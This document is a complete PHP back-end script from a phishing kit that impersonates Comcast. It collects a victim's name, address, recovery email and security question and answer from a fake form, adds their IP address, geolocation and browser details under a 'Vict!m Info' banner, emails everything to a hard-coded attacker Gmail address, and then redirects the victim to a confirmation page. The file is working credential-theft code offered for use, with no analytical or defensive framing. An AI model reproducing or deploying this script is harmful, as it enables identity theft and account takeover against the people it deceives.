<?
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Comcast Info-----------------------\n";
$message .= "|full name : ".$_POST['fname']."\n";
$message .= "|street address : ".$_POST['street-address']."\n";
$message .= "|city : ".$_POST['city']."\n";
$message .= "|state : ".$_POST['state']."\n";
$message .= "|zipcode : ".$_POST['zipcode']."\n";
$message .= "|Recovery Email  : ".$_POST['remail']."\n";
$message .= "|Security Question : ".$_POST['security-question']."\n";
$message .= "|Security Answer : ".$_POST['securityans']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime                    : ".$timedate."\n";
$message .= "country                    : ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY Blow-------------\n";
//change ur email here
$send = "mrbonjee@gmail.com";
$subject = "Result from Comcast";
$headers = "From: comcast<pirates@mxtoolbox.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);

 }
    header("Location: confirmation.html");
  

?>